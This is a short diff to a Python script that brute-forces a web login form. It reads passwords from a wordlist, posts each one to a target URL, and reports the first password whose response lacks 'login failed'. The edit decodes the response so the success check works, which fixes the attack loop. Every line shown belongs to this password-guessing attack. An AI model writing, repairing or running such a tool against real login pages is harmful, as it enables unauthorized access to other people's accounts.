@@ -10,7 +10,7 @@ with open("/directory*/path*/folder*/passwords.txt", "r") as passwords_file:
         passwd = p_line.strip()
         data_dictionary["password"] = passwd
         response = requests.post(target_url, data=data_dictionary)
-        if "login failed" not in response.content:
+        if "login failed" not in response.content.decode():
             print("[+] Password found --> " + passwd)
             exit()
 
